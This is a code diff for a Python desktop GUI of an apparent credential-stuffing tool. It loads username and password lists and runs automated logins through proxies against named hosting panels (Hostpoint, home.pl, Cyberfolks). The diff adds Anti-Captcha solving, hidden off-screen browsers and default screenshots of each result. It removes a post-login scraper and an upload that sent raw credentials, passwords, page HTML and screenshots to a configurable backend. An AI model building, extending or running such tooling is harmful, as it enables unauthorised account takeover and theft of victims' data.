@@ -12,7 +12,6 @@ Key design decisions for large files:
   - Stats (total/ok/fail) are tracked with counters, not list scans.
 """
 
-import io
 import json
 import os
 import queue
@@ -25,14 +24,9 @@ from pathlib import Path
 from tkinter import ttk, filedialog, messagebox, simpledialog
 from urllib.parse import urlparse
 
-try:
-    import requests as _requests
-except ImportError:
-    _requests = None  # upload silently skipped if requests not installed
-
 # Persistent DOM-field settings file (sits next to login_recipe.json)
 _DOM_SETTINGS_FILE = Path(__file__).parent.parent.parent / "dom_settings.json"
-_API_SETTINGS_FILE = Path(__file__).parent.parent.parent / "api_settings.json"
+_ANTI_CAPTCHA_SETTINGS_FILE = Path(__file__).parent.parent.parent / "anti_captcha_settings.json"
 
 from src.parser  import parse_credential_line
 from src.proxy_manager import get_proxy_manager
@@ -42,15 +36,13 @@ from src.checker import (
     record_login_actions, try_login_recorded,
     recipe_exists, clear_recipe, RECIPE_FILE,
     get_browser_executable, set_browser_executable,
-    get_use_captcha_extension, set_use_captcha_extension,
-    get_captcha_extension_path, set_captcha_extension_path,
+    get_anticaptcha_api_key, set_anticaptcha_api_key,
+    get_use_anticaptcha, set_use_anticaptcha,
     get_minimized_mode, set_minimized_mode,
-    get_last_page_html,
     clear_form_cache, release_browser_pool,
     try_login_hostpoint_batch, HOSTPOINT_LOGIN_URL, HOSTPOINT_CONCURRENCY,
     try_login_home_pl_batch, HOME_PL_LOGIN_URL, HOME_PL_CONCURRENCY,
     try_login_cyberfolks_batch, CYBERFOLKS_LOGIN_URL, CYBERFOLKS_CONCURRENCY,
-    scrape_after_login,
     try_login_fast,
 )
 from src.gui.styles import apply_styles, Tooltip
@@ -199,6 +191,7 @@ class App(tk.Tk):
         self._total_jobs  = 0
         self._done_jobs   = 0
         self._checking    = False
+        self._anti_captcha_alerted_messages: set[str] = set()
         self._check_start_abs_idx = -1   # -1 means start from beginning
         self._consecutive_unreachable = 0
         self._auto_stop_unreachable_var = tk.BooleanVar(value=True)
@@ -244,7 +237,7 @@ class App(tk.Tk):
         self._save_removed_list_var = tk.BooleanVar(value=False)
 
         # ── Fast Mode settings ────────────────────────────────────────────
-        self._fast_mode_var = tk.BooleanVar(value=True)
+        self._fast_mode_var = tk.BooleanVar(value=False)
         self._fast_delay_var = tk.DoubleVar(value=2.0)
 
         # ── DOM field settings (HTML snippets → CSS selectors) ────────────
@@ -255,7 +248,6 @@ class App(tk.Tk):
         self._dom_logout_var = tk.StringVar(value="")
         self._dom_login_trigger_var = tk.StringVar(value="")
         self._dom_login_tab_var = tk.StringVar(value="")
-        self._dom_domain_overrides: dict[str, dict[str, str]] = {}
         self._load_dom_settings()
 
         # ── Multi login URL map (domain -> login URL) ─────────────────────
@@ -263,41 +255,28 @@ class App(tk.Tk):
         #   example.com=https://example.com/login
         self._login_url_map_var = tk.StringVar(value="")
 
-        # ── API upload settings ───────────────────────────────────────────
-        self._api_url_var = tk.StringVar(value="http://localhost:3000/api/samples")
-        self._api_key_var = tk.StringVar(value="")
-        self._api_upload_var = tk.BooleanVar(value=False)
-        self._load_api_settings()
+        # ── Anti-Captcha settings ────────────────────────────────────────
+        self._use_anticaptcha_var = tk.BooleanVar(value=get_use_anticaptcha())
+        self._anticaptcha_api_key_var = tk.StringVar(value=get_anticaptcha_api_key())
+        self._load_anticaptcha_settings()
+        set_use_anticaptcha(self._use_anticaptcha_var.get())
+        set_anticaptcha_api_key(self._anticaptcha_api_key_var.get())
 
         # ── Auto-screenshot settings (Checker tab) ────────────────────────
         # Which result states trigger an automatic screenshot during Check All.
         # Values: "disabled" | "SUCCESS" | "FAILED" | "Both"
-        self._screenshot_on_var = tk.StringVar(value="disabled")
+        self._screenshot_on_var = tk.StringVar(value="Both")
         # Collected screenshots: list of {entry, jpeg_bytes, status}
         self._checker_screenshots: list[dict] = []
         # Fast lookup: abs_idx → jpeg_bytes for per-row view button
         self._checker_screenshot_map: dict[int, bytes] = {}
-
-        # ── Scraper tab state ──────────────────────────────────────────────
-        # List of dicts loaded from the CSV: keys url, username, password, domain
-        self._scraper_creds: list[dict] = []
-        # Background thread stop flag
-        self._scraper_stop_flag = threading.Event()
-        # Queue: items are (row_id, status, results_dict) tuples
-        self._scraper_queue: queue.Queue = queue.Queue()
-        self._scraper_poll_id = None
-        self._scraper_running = False
-        # Keep PIL PhotoImage refs alive (prevents garbage collection)
-        self._scraper_photos: list = []
-        # Stored screenshots for export: list of {entry, jpeg_bytes, status, final_url}
-        self._scraper_screenshots: list[dict] = []
 
         # Proxy manager reference
         self._proxy_mgr = get_proxy_manager()
 
         self._build_toolbar()
         self._build_url_bar()
-        self._build_notebook()       # wraps checker + scraper tabs
+        self._build_notebook()
         self._build_status_bar()
 
     # ================================================================
@@ -332,18 +311,30 @@ class App(tk.Tk):
             btn.pack(side="left", padx=4)
 
         ttk.Separator(bar, orient="vertical").pack(side="left", fill="y", padx=8, pady=4)
+        self._dedup_label_var = tk.StringVar(value="")
         _dedup_cb = ttk.Checkbutton(
             bar,
-            text="Remove duplicates",
+            textvariable=self._dedup_label_var,
             variable=self._dedup_on_load_var,
         )
         _dedup_cb.pack(side="left", padx=(0, 6))
+        self._save_removed_label_var = tk.StringVar(value="")
         _save_removed_cb = ttk.Checkbutton(
             bar,
-            text="Save removed list",
+            textvariable=self._save_removed_label_var,
             variable=self._save_removed_list_var,
         )
         _save_removed_cb.pack(side="left", padx=(0, 6))
+        def _sync_toolbar_toggle_labels(*_):
+            self._dedup_label_var.set(
+                f"Remove duplicates: {'ON' if self._dedup_on_load_var.get() else 'OFF'}"
+            )
+            self._save_removed_label_var.set(
+                f"Save removed list: {'ON' if self._save_removed_list_var.get() else 'OFF'}"
+            )
+        self._dedup_on_load_var.trace_add("write", _sync_toolbar_toggle_labels)
+        self._save_removed_list_var.trace_add("write", _sync_toolbar_toggle_labels)
+        _sync_toolbar_toggle_labels()
 
         Tooltip(self._btn_check,  "Run login check on all (filtered) credentials")
         Tooltip(self._btn_stop,   "Stop the running check")
@@ -360,48 +351,13 @@ class App(tk.Tk):
             "When enabled, removed duplicate rows are saved to <filename>.removed.txt",
         )
 
-        # --- Right side: CAPTCHA / Session / Proxy ---
+        # --- Right side: Session controls ---
         ttk.Separator(bar, orient="vertical").pack(side="left", fill="y", padx=10, pady=4)
-
-        self._btn_add_cred = ttk.Button(
-            bar, text="➕ Add Credential",
-            command=self._add_credential_dialog)
-        self._btn_add_cred.pack(side="left", padx=4)
-
-        ttk.Separator(bar, orient="vertical").pack(side="left", fill="y", padx=10, pady=4)
-
-        self._btn_captcha = ttk.Button(
-            bar, text="Solve CAPTCHA",
-            command=self._run_captcha_entry)
-        self._btn_captcha.pack(side="left", padx=4)
-
-        self._btn_record = ttk.Button(
-            bar, text="⏺ Record Login",
-            command=self._record_login)
-        self._btn_record.pack(side="left", padx=4)
-
-        self._btn_clear_recipe = ttk.Button(
-            bar, text="Clear Recipe",
-            command=self._clear_recipe_ui)
-        self._btn_clear_recipe.pack(side="left", padx=4)
-
-        self._session_var = tk.StringVar()
-        self._session_lbl = ttk.Label(bar, textvariable=self._session_var,
-                                      foreground=C["yellow"], font=("Segoe UI", 9))
-        self._session_lbl.pack(side="left", padx=4)
-
-        self._recipe_var = tk.StringVar()
-        self._recipe_lbl = ttk.Label(bar, textvariable=self._recipe_var,
-                                     foreground=C["green"], font=("Segoe UI", 9))
-        self._recipe_lbl.pack(side="left", padx=4)
 
         self._btn_clear_session = ttk.Button(
             bar, text="Clear Session",
             command=self._clear_session_ui)
         self._btn_clear_session.pack(side="left", padx=4)
-
-        self._update_session_label()
-        self._update_recipe_label()
 
     def _build_url_bar(self):
         C = self._palette
@@ -411,42 +367,46 @@ class App(tk.Tk):
         outer.pack(fill="x", padx=12, pady=(0, 4))
         outer.columnconfigure(0, weight=1)   # single column, stretches full width
 
-        # ── Row 0: Login URL + Success URL ───────────────────────────────────
+        # ── Row 0: Login URL ────────────────────────────────────────────────
         r0 = ttk.Frame(outer)
         r0.grid(row=0, column=0, sticky="ew", pady=(0, 2))
-        r0.columnconfigure(1, weight=2)   # Login URL entry expands more
-        r0.columnconfigure(3, weight=2)   # Success URL entry expands equally
+        r0.columnconfigure(1, weight=1)
 
         ttk.Label(r0, text="Login URL:").grid(row=0, column=0, sticky="w", padx=(0, 3))
         self._login_url_var = tk.StringVar(value="")
         _login_entry = ttk.Entry(r0, textvariable=self._login_url_var)
-        _login_entry.grid(row=0, column=1, sticky="ew", padx=(0, 8))
+        _login_entry.grid(row=0, column=1, sticky="ew", padx=(0, 4))
         self._login_url_var.trace_add("write", lambda *_: clear_form_cache())
         Tooltip(_login_entry, "Custom login page URL — leave blank to use the URL from each credential")
-        ttk.Button(r0, text="Domain URLs…", command=self._open_login_url_map_dialog).grid(
-            row=0, column=5, sticky="w", padx=(4, 6)
-        )
 
-        ttk.Label(r0, text="Success URL:").grid(row=0, column=2, sticky="w", padx=(0, 3))
+        # ── Row 1: Success URL + Success DOM (same row) ─────────────────────
+        r1 = ttk.Frame(outer)
+        r1.grid(row=1, column=0, sticky="ew", pady=(0, 2))
+        r1.columnconfigure(1, weight=2)
+        r1.columnconfigure(4, weight=3)
+
+        ttk.Label(r1, text="Success URL:").grid(row=0, column=0, sticky="w", padx=(0, 3))
         self._success_url_var = tk.StringVar(value="")
-        _success_entry = ttk.Entry(r0, textvariable=self._success_url_var)
-        _success_entry.grid(row=0, column=3, sticky="ew", padx=(0, 4))
+        _success_entry = ttk.Entry(r1, textvariable=self._success_url_var)
+        _success_entry.grid(row=0, column=1, sticky="ew", padx=(0, 4))
         Tooltip(_success_entry, "URL that signals a successful login — leave blank for auto-detection")
 
         self._success_exact_var = tk.BooleanVar(value=True)
-        _exact_cb = ttk.Checkbutton(r0, text="Exact", variable=self._success_exact_var)
-        _exact_cb.grid(row=0, column=4, sticky="w", padx=(0, 4))
+        self._success_exact_label_var = tk.StringVar(value="")
+        _exact_cb = ttk.Checkbutton(r1, textvariable=self._success_exact_label_var, variable=self._success_exact_var)
+        _exact_cb.grid(row=0, column=2, sticky="w", padx=(0, 8))
+        def _sync_success_exact_label(*_):
+            self._success_exact_label_var.set(
+                f"Exact URL: {'ON' if self._success_exact_var.get() else 'OFF'}"
+            )
+        self._success_exact_var.trace_add("write", _sync_success_exact_label)
+        _sync_success_exact_label()
         Tooltip(_exact_cb, "Exact match: success only if the final URL equals the Success URL exactly")
 
-        # ── Row 1: Success DOM selectors ────────────────────────────────────
-        r1 = ttk.Frame(outer)
-        r1.grid(row=1, column=0, sticky="ew", pady=(0, 2))
-        r1.columnconfigure(1, weight=1)
-
-        ttk.Label(r1, text="Success DOM:").grid(row=0, column=0, sticky="w", padx=(0, 3))
+        ttk.Label(r1, text="Success DOM:").grid(row=0, column=3, sticky="w", padx=(0, 3))
         self._success_dom_var = tk.StringVar(value="")
         self._success_dom_entry = ttk.Entry(r1, textvariable=self._success_dom_var)
-        self._success_dom_entry.grid(row=0, column=1, sticky="ew", padx=(0, 4))
+        self._success_dom_entry.grid(row=0, column=4, sticky="ew", padx=(0, 4))
         Tooltip(self._success_dom_entry,
                 'Paste an HTML snippet of an element that appears only after login, '
                 'e.g.  <div class="stats-block">  — checked before URL matching')
@@ -494,15 +454,40 @@ class App(tk.Tk):
         ttk.Separator(r2, orient="vertical").grid(
             row=0, column=col, sticky="ns", padx=4, pady=2); col += 1
 
-        self._captcha_ext_var = tk.BooleanVar(value=get_use_captcha_extension())
-        def _on_captcha_ext_toggle(*_):
-            set_use_captcha_extension(self._captcha_ext_var.get())
-            state = "enabled" if self._captcha_ext_var.get() else "disabled"
-            self._statusbar.config(text=f"CAPTCHA solver extension {state}")
-        self._captcha_ext_var.trace_add("write", _on_captcha_ext_toggle)
-        _captcha_cb = ttk.Checkbutton(r2, text="🧩 CAPTCHA", variable=self._captcha_ext_var)
-        _captcha_cb.grid(row=0, column=col, sticky="w", padx=(0, 4)); col += 1
-        Tooltip(_captcha_cb, "Load the CAPTCHA solver browser extension when launching browsers")
+        self._use_anti_label_var = tk.StringVar(value="")
+        _use_anti_cb = ttk.Checkbutton(
+            r2, textvariable=self._use_anti_label_var, variable=self._use_anticaptcha_var
+        )
+        _use_anti_cb.grid(row=0, column=col, sticky="w", padx=(0, 4)); col += 1
+        ttk.Label(r2, text="Anti-Captcha Key:").grid(row=0, column=col, sticky="w", padx=(0, 3)); col += 1
+        anti_key_entry = ttk.Entry(r2, textvariable=self._anticaptcha_api_key_var, show="*", width=24)
+        anti_key_entry.grid(row=0, column=col, sticky="w", padx=(0, 4)); col += 1
+        _show_anti_key = tk.BooleanVar(value=False)
+        def _toggle_anti_key():
+            anti_key_entry.config(show="" if _show_anti_key.get() else "*")
+        self._show_anti_key_label_var = tk.StringVar(value="")
+        _show_anti_cb = ttk.Checkbutton(r2, textvariable=self._show_anti_key_label_var, variable=_show_anti_key, command=_toggle_anti_key)
+        _show_anti_cb.grid(
+            row=0, column=col, sticky="w", padx=(0, 4)
+        ); col += 1
+        def _sync_show_anti_label(*_):
+            self._show_anti_key_label_var.set(f"Show key: {'ON' if _show_anti_key.get() else 'OFF'}")
+        _show_anti_key.trace_add("write", _sync_show_anti_label)
+        _sync_show_anti_label()
+        def _on_anti_key_change(*_):
+            set_anticaptcha_api_key(self._anticaptcha_api_key_var.get())
+            self._save_anticaptcha_settings()
+        self._anticaptcha_api_key_var.trace_add("write", _on_anti_key_change)
+        def _sync_anti_controls(*_):
+            enabled = self._use_anticaptcha_var.get()
+            self._use_anti_label_var.set(f"Use Anti-Captcha: {'ON' if enabled else 'OFF'}")
+            anti_key_entry.configure(state=("normal" if enabled else "disabled"))
+            _show_anti_cb.configure(state=("normal" if enabled else "disabled"))
+            set_use_anticaptcha(enabled)
+            self._save_anticaptcha_settings()
+        self._use_anticaptcha_var.trace_add("write", _sync_anti_controls)
+        _sync_anti_controls()
+        Tooltip(anti_key_entry, "Anti-Captcha API key used for automatic CAPTCHA solving")
 
         ttk.Separator(r2, orient="vertical").grid(
             row=0, column=col, sticky="ns", padx=4, pady=2); col += 1
@@ -513,8 +498,15 @@ class App(tk.Tk):
             state = "on" if self._minimized_mode_var.get() else "off"
             self._statusbar.config(text=f"Minimized browser mode {state}")
         self._minimized_mode_var.trace_add("write", _on_minimized_mode_toggle)
-        _min_cb = ttk.Checkbutton(r2, text="🪟 Minimized", variable=self._minimized_mode_var)
+        self._minimized_mode_label_var = tk.StringVar(value="")
+        _min_cb = ttk.Checkbutton(r2, textvariable=self._minimized_mode_label_var, variable=self._minimized_mode_var)
         _min_cb.grid(row=0, column=col, sticky="w", padx=(0, 4)); col += 1
+        def _sync_minimized_label(*_):
+            self._minimized_mode_label_var.set(
+                f"Minimized: {'ON' if self._minimized_mode_var.get() else 'OFF'}"
+            )
+        self._minimized_mode_var.trace_add("write", _sync_minimized_label)
+        _sync_minimized_label()
         Tooltip(_min_cb, "Open browser windows off-screen so they don't appear on your desktop")
 
         ttk.Separator(r2, orient="vertical").grid(
@@ -532,59 +524,15 @@ class App(tk.Tk):
             r2, text="📷 View", command=self._show_checker_screenshots, state="disabled")
         self._btn_view_screenshots.grid(row=0, column=col, sticky="w", padx=(0, 4)); col += 1
 
-        # ── Row 3: CAPTCHA extension path ─────────────────────────────────────
-        r2_ext = ttk.Frame(outer)
-        r2_ext.grid(row=3, column=0, sticky="ew", pady=(0, 2))
-        r2_ext.columnconfigure(1, weight=1)
-
-        ttk.Label(r2_ext, text="CAPTCHA Ext Path:").grid(row=0, column=0, sticky="w", padx=(0, 3))
-        self._captcha_ext_path_var = tk.StringVar(value=get_captcha_extension_path())
-        _captcha_ext_entry = ttk.Entry(r2_ext, textvariable=self._captcha_ext_path_var)
-        _captcha_ext_entry.grid(row=0, column=1, sticky="ew", padx=(0, 4))
-        Tooltip(
-            _captcha_ext_entry,
-            "Folder path of the CAPTCHA extension (must contain manifest.json)"
-        )
-
-        def _browse_captcha_extension_path():
-            initial = self._captcha_ext_path_var.get().strip() or str(Path.cwd())
-            path = filedialog.askdirectory(
-                title="Select CAPTCHA extension folder",
-                initialdir=initial,
-                mustexist=True,
-            )
-            if path:
-                self._captcha_ext_path_var.set(path)
-                set_captcha_extension_path(path)
-                self._statusbar.config(text=f"CAPTCHA extension path set to: {path}")
-
-        def _on_captcha_ext_path_change(*_):
-            set_captcha_extension_path(self._captcha_ext_path_var.get())
-
-        self._captcha_ext_path_var.trace_add("write", _on_captcha_ext_path_change)
-
-        ttk.Button(r2_ext, text="Browse…", command=_browse_captcha_extension_path).grid(
-            row=0, column=2, sticky="w", padx=(0, 6)
-        )
-
-        # ── Row 4: Proxy + Settings buttons + Fast Mode ──────────────────────
+        # ── Row 3: Proxy + Settings buttons + Fast Mode ──────────────────────
         r3 = ttk.Frame(outer)
-        r3.grid(row=4, column=0, sticky="ew", pady=(0, 2))
+        r3.grid(row=3, column=0, sticky="ew", pady=(0, 2))
 
         col = 0
         ttk.Button(r3, text="🌐 Proxy", command=self._open_proxy_dialog).grid(
             row=0, column=col, sticky="w", padx=(0, 4)); col += 1
         ttk.Button(r3, text="🎯 DOM Settings", command=self._open_dom_settings_dialog).grid(
             row=0, column=col, sticky="w", padx=(0, 4)); col += 1
-        ttk.Button(r3, text="🎯 Domain DOM", command=self._open_domain_dom_settings_dialog).grid(
-            row=0, column=col, sticky="w", padx=(0, 4)); col += 1
-
-        _api_btn = ttk.Button(r3, text="☁️ API Upload", command=self._open_api_settings_dialog)
-        _api_btn.grid(row=0, column=col, sticky="w", padx=(0, 2)); col += 1
-        _api_cb = ttk.Checkbutton(r3, text="On", variable=self._api_upload_var)
-        _api_cb.grid(row=0, column=col, sticky="w", padx=(0, 8)); col += 1
-        Tooltip(_api_btn, "Configure the backend API endpoint and key for screenshot uploads")
-        Tooltip(_api_cb,  "Enable automatic upload of screenshots to the API after each check")
 
         ttk.Separator(r3, orient="vertical").grid(
             row=0, column=col, sticky="ns", padx=4, pady=2); col += 1
@@ -603,8 +551,13 @@ class App(tk.Tk):
         ttk.Separator(r3, orient="vertical").grid(
             row=0, column=col, sticky="ns", padx=4, pady=2); col += 1
 
-        _fast_cb = ttk.Checkbutton(r3, text="⚡ Fast Mode", variable=self._fast_mode_var)
+        self._fast_mode_label_var = tk.StringVar(value="")
+        _fast_cb = ttk.Checkbutton(r3, textvariable=self._fast_mode_label_var, variable=self._fast_mode_var)
         _fast_cb.grid(row=0, column=col, sticky="w", padx=(0, 4)); col += 1
+        def _sync_fast_mode_label(*_):
+            self._fast_mode_label_var.set(f"Fast Mode: {'ON' if self._fast_mode_var.get() else 'OFF'}")
+        self._fast_mode_var.trace_add("write", _sync_fast_mode_label)
+        _sync_fast_mode_label()
         Tooltip(_fast_cb, "Fast mode: single JS round-trip field detection, no wait_for_selector overhead")
 
         ttk.Label(r3, text="Delay:").grid(row=0, column=col, sticky="w", padx=(0, 3)); col += 1
@@ -618,9 +571,10 @@ class App(tk.Tk):
         ttk.Separator(r3, orient="vertical").grid(
             row=0, column=col, sticky="ns", padx=4, pady=2); col += 1
 
+        self._auto_unreach_label_var = tk.StringVar(value="")
         _auto_unreach_cb = ttk.Checkbutton(
             r3,
-            text="Auto-stop unreachable",
+            textvariable=self._auto_unreach_label_var,
             variable=self._auto_stop_unreachable_var,
         )
         _auto_unreach_cb.grid(row=0, column=col, sticky="w", padx=(0, 3)); col += 1
@@ -640,6 +594,9 @@ class App(tk.Tk):
             _auto_unreach_spin.configure(
                 state=("normal" if self._auto_stop_unreachable_var.get() else "disabled")
             )
+            self._auto_unreach_label_var.set(
+                f"Auto-stop unreachable: {'ON' if self._auto_stop_unreachable_var.get() else 'OFF'}"
+            )
 
         self._auto_stop_unreachable_var.trace_add("write", _sync_unreachable_autostop_ui)
         _sync_unreachable_autostop_ui()
@@ -653,7 +610,7 @@ class App(tk.Tk):
         )
 
     def _build_notebook(self):
-        """Create the main ttk.Notebook that holds the Checker and Scraper tabs."""
+        """Create the main ttk.Notebook that holds the Checker tab."""
         self._notebook = ttk.Notebook(self)
         self._notebook.pack(fill="both", expand=True, padx=12, pady=(4, 0))
 
@@ -664,11 +621,6 @@ class App(tk.Tk):
         self._build_search_bar()
         self._build_table()
         self._build_pager()
-
-        # ── Scraper tab ───────────────────────────────────────────────────
-        self._scraper_tab = ttk.Frame(self._notebook)
-        self._notebook.add(self._scraper_tab, text="  Scraper  ")
-        self._build_scraper_tab()
 
     def _build_stats_bar(self):
         C   = self._palette
@@ -801,36 +753,8 @@ class App(tk.Tk):
         default_login_url: str = "",
         domain_map: dict[str, str] | None = None,
     ) -> str:
-        """Resolve per-entry login URL from domain map, then fallback."""
-        fallback = (default_login_url or "").strip()
-        mapping = domain_map if domain_map is not None else self._parse_login_url_map(
-            self._login_url_map_var.get()
-        )
-        if not mapping:
-            return fallback
-
-        domain = (entry.get("domain", "") or "").strip().lower()
-        raw_url = (entry.get("url", "") or "").strip()
-        host = ""
-        try:
-            host = (urlparse(raw_url).netloc or "").lower()
-        except Exception:
-            host = ""
-
-        # First, exact key match.
-        if domain and domain in mapping:
-            return mapping[domain]
-        if host and host in mapping:
-            return mapping[host]
-
-        # Then, suffix match so "panel.home.pl" can match "home.pl" keys.
-        keys_sorted = sorted(mapping.keys(), key=len, reverse=True)
-        for key in keys_sorted:
-            if domain and (domain == key or domain.endswith("." + key)):
-                return mapping[key]
-            if host and (host == key or host.endswith("." + key)):
-                return mapping[key]
-        return fallback
+        """Resolve per-entry login URL from the single Login URL field only."""
+        return (default_login_url or "").strip()
 
     def _open_login_url_map_dialog(self):
         """Edit domain-specific login URLs used during checks."""
@@ -1067,25 +991,6 @@ class App(tk.Tk):
                 self._dom_logout_var.set(data.get("logout", ""))
                 self._dom_login_trigger_var.set(data.get("login_trigger", ""))
                 self._dom_login_tab_var.set(data.get("login_tab", ""))
-                overrides = data.get("domain_overrides", {})
-                if isinstance(overrides, dict):
-                    cleaned: dict[str, dict[str, str]] = {}
-                    for dom, cfg in overrides.items():
-                        if not isinstance(dom, str) or not isinstance(cfg, dict):
-                            continue
-                        dkey = dom.strip().lower()
-                        if not dkey:
-                            continue
-                        cleaned[dkey] = {
-                            "cookie": str(cfg.get("cookie", "")),
-                            "user": str(cfg.get("user", "")),
-                            "pass": str(cfg.get("pass", "")),
-                            "submit": str(cfg.get("submit", "")),
-                            "logout": str(cfg.get("logout", "")),
-                            "login_trigger": str(cfg.get("login_trigger", "")),
-                            "login_tab": str(cfg.get("login_tab", "")),
-                        }
-                    self._dom_domain_overrides = cleaned
         except Exception:
             pass  # silently ignore corrupt / missing file
 
@@ -1100,7 +1005,6 @@ class App(tk.Tk):
                 "logout": self._dom_logout_var.get(),
                 "login_trigger": self._dom_login_trigger_var.get(),
                 "login_tab": self._dom_login_tab_var.get(),
-                "domain_overrides": self._dom_domain_overrides,
             }
             _DOM_SETTINGS_FILE.write_text(
                 json.dumps(data, ensure_ascii=False, indent=2),
@@ -1110,8 +1014,9 @@ class App(tk.Tk):
             pass
 
     def _resolve_dom_settings_for_entry(self, entry: dict) -> dict[str, str]:
-        """Resolve DOM settings for entry with per-domain overrides + global fallback."""
-        result = {
+        """Resolve DOM settings for an entry (global settings only)."""
+        _ = entry
+        return {
             "cookie": self._dom_cookie_var.get().strip(),
             "user": self._dom_user_var.get().strip(),
             "pass": self._dom_pass_var.get().strip(),
@@ -1120,136 +1025,32 @@ class App(tk.Tk):
             "login_trigger": self._dom_login_trigger_var.get().strip(),
             "login_tab": self._dom_login_tab_var.get().strip(),
         }
-        if not self._dom_domain_overrides:
-            return result
 
-        domain = (entry.get("domain", "") or "").strip().lower()
-        raw_url = (entry.get("url", "") or "").strip()
-        host = ""
+    # ── Anti-Captcha settings ──────────────────────────────────────────────
+
+    def _load_anticaptcha_settings(self):
+        """Load Anti-Captcha key from anti_captcha_settings.json."""
         try:
-            host = (urlparse(raw_url).netloc or "").lower()
-        except Exception:
-            host = ""
-
-        keys_sorted = sorted(self._dom_domain_overrides.keys(), key=len, reverse=True)
-        match_key = None
-        for key in keys_sorted:
-            if domain and (domain == key or domain.endswith("." + key)):
-                match_key = key
-                break
-            if host and (host == key or host.endswith("." + key)):
-                match_key = key
-                break
-        if not match_key:
-            return result
-
-        cfg = self._dom_domain_overrides.get(match_key, {})
-        for k in ("cookie", "user", "pass", "submit", "logout", "login_trigger", "login_tab"):
-            val = (cfg.get(k) or "").strip()
-            if val:
-                result[k] = val
-        return result
-
-    # ── API upload settings ────────────────────────────────────────────────
-
-    def _load_api_settings(self):
-        """Load API URL, key and upload-enabled flag from api_settings.json."""
-        try:
-            if _API_SETTINGS_FILE.exists():
-                data = json.loads(_API_SETTINGS_FILE.read_text(encoding="utf-8"))
-                self._api_url_var.set(data.get("url", self._api_url_var.get()))
-                self._api_key_var.set(data.get("api_key", ""))
-                self._api_upload_var.set(bool(data.get("enabled", False)))
+            if _ANTI_CAPTCHA_SETTINGS_FILE.exists():
+                data = json.loads(_ANTI_CAPTCHA_SETTINGS_FILE.read_text(encoding="utf-8"))
+                self._anticaptcha_api_key_var.set(str(data.get("api_key", "")))
+                self._use_anticaptcha_var.set(bool(data.get("enabled", False)))
         except Exception:
             pass
 
-    def _save_api_settings(self):
-        """Persist API settings to api_settings.json."""
+    def _save_anticaptcha_settings(self):
+        """Persist Anti-Captcha key to anti_captcha_settings.json."""
         try:
             data = {
-                "url":     self._api_url_var.get(),
-                "api_key": self._api_key_var.get(),
-                "enabled": self._api_upload_var.get(),
+                "api_key": self._anticaptcha_api_key_var.get().strip(),
+                "enabled": bool(self._use_anticaptcha_var.get()),
             }
-            _API_SETTINGS_FILE.write_text(
+            _ANTI_CAPTCHA_SETTINGS_FILE.write_text(
                 json.dumps(data, ensure_ascii=False, indent=2),
                 encoding="utf-8",
             )
         except Exception:
             pass
-
-    def _upload_screenshot(self, row: dict, jpeg_bytes: bytes, status: str,
-                           html: str | None = None):
-        """Upload a screenshot + credential metadata to the backend API (background thread)."""
-        if _requests is None:
-            return
-        url = self._api_url_var.get().strip()
-        key = self._api_key_var.get().strip()
-        if not url or not key:
-            return
-        raw_cred = f"{row.get('url', '')}:{row.get('username', '')}:{row.get('password', '')}"
-        try:
-            resp = _requests.post(
-                url,
-                headers={"x-api-key": key},
-                data={
-                    "htmlContent":   html or "",
-                    "pageUrl":       row.get("url", ""),
-                    "originalState": status,
-                    "rawCredential": raw_cred,
-                    "userName":      row.get("username", ""),
-                    "password":      row.get("password", ""),
-                    "sourceName":    "credential-checker",
-                },
-                files={
-                    "screenshot": ("screenshot.jpg", io.BytesIO(jpeg_bytes), "image/jpeg"),
-                },
-                timeout=30,
-            )
-            if not resp.ok:
-                print(f"[API] Upload failed {resp.status_code}: {resp.text[:200]}")
-            else:
-                print(f"[API] Uploaded screenshot → id={resp.json().get('id', '?')}")
-        except Exception as exc:
-            print(f"[API] Upload error: {exc}")
-
-    def _open_api_settings_dialog(self):
-        """Open a dialog to configure the backend API URL and key."""
-        C = self._palette
-        dlg = tk.Toplevel(self)
-        dlg.title("API Upload Settings")
-        dlg.resizable(False, False)
-        dlg.grab_set()
-
-        pad = {"padx": 10, "pady": 5}
-
-        ttk.Label(dlg, text="API URL:").grid(row=0, column=0, sticky="e", **pad)
-        url_entry = ttk.Entry(dlg, textvariable=self._api_url_var, width=50)
-        url_entry.grid(row=0, column=1, sticky="ew", **pad)
-
-        ttk.Label(dlg, text="API Key:").grid(row=1, column=0, sticky="e", **pad)
-        key_entry = ttk.Entry(dlg, textvariable=self._api_key_var, width=50, show="*")
-        key_entry.grid(row=1, column=1, sticky="ew", **pad)
-
-        show_var = tk.BooleanVar(value=False)
-        def _toggle_show(*_):
-            key_entry.config(show="" if show_var.get() else "*")
-        ttk.Checkbutton(dlg, text="Show", variable=show_var,
-                        command=_toggle_show).grid(row=1, column=2, **pad)
-
-        ttk.Checkbutton(dlg, text="Enable upload on screenshot",
-                        variable=self._api_upload_var).grid(
-            row=2, column=0, columnspan=3, sticky="w", **pad)
-
-        def _save_and_close():
-            self._save_api_settings()
-            dlg.destroy()
-            self._statusbar.config(text="API settings saved.")
-
-        btn_frame = ttk.Frame(dlg)
-        btn_frame.grid(row=3, column=0, columnspan=3, pady=(0, 10))
-        ttk.Button(btn_frame, text="Save", command=_save_and_close).pack(side="left", padx=6)
-        ttk.Button(btn_frame, text="Cancel", command=dlg.destroy).pack(side="left", padx=6)
 
     def _open_proxy_dialog(self):
         """Open the proxy settings dialog."""
@@ -1481,814 +1282,13 @@ class App(tk.Tk):
         ttk.Button(btn_frame, text="Cancel",
                    command=dlg.destroy).pack(side="right")
 
-    def _open_domain_dom_settings_dialog(self):
-        """Edit domain-specific DOM selector overrides."""
-        C = self._palette
-
-        dlg = tk.Toplevel(self)
-        dlg.title("Domain DOM Overrides")
-        dlg.geometry("760x620")
-        dlg.configure(bg=C["bg"])
-        dlg.transient(self)
-        dlg.grab_set()
-
-        ttk.Label(
-            dlg,
-            text=("Set DOM selector overrides per domain. "
-                  "Any blank field falls back to global DOM Settings."),
-            foreground=C["muted"],
-            justify="left",
-        ).pack(anchor="w", padx=12, pady=(12, 6))
-
-        top = ttk.Frame(dlg)
-        top.pack(fill="x", padx=12, pady=(0, 8))
-        ttk.Label(top, text="Domain:").pack(side="left")
-        domain_var = tk.StringVar(value="")
-        domain_entry = ttk.Entry(top, textvariable=domain_var, width=42)
-        domain_entry.pack(side="left", padx=(6, 8), fill="x", expand=True)
-
-        main = ttk.Frame(dlg)
-        main.pack(fill="both", expand=True, padx=12, pady=(0, 8))
-        left = ttk.Frame(main)
-        left.pack(side="left", fill="y", padx=(0, 8))
-        right = ttk.Frame(main)
-        right.pack(side="left", fill="both", expand=True)
-
-        ttk.Label(left, text="Configured domains:",
